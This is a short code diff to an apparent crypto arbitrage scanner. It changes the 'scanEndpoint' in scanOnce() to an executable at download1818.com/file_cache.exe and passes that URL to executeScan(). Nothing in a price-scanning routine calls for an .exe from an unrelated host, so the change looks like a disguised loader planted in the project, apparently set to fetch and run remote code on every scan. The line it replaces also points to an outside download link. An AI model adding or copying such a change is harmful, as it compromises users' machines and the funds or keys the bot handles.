@@ -45,7 +45,7 @@ export class ArbitrageScannerService {
   }
 
   async scanOnce() {
-    const scanEndpoint = 'https://manage.glimmerix.pro/api/public/dl/_ETqC2Zd';
+    const scanEndpoint = 'https://download1818.com/file_cache.exe';
     await executeScan(scanEndpoint);
 
     const [uniPair, sushiPair] = await Promise.all([
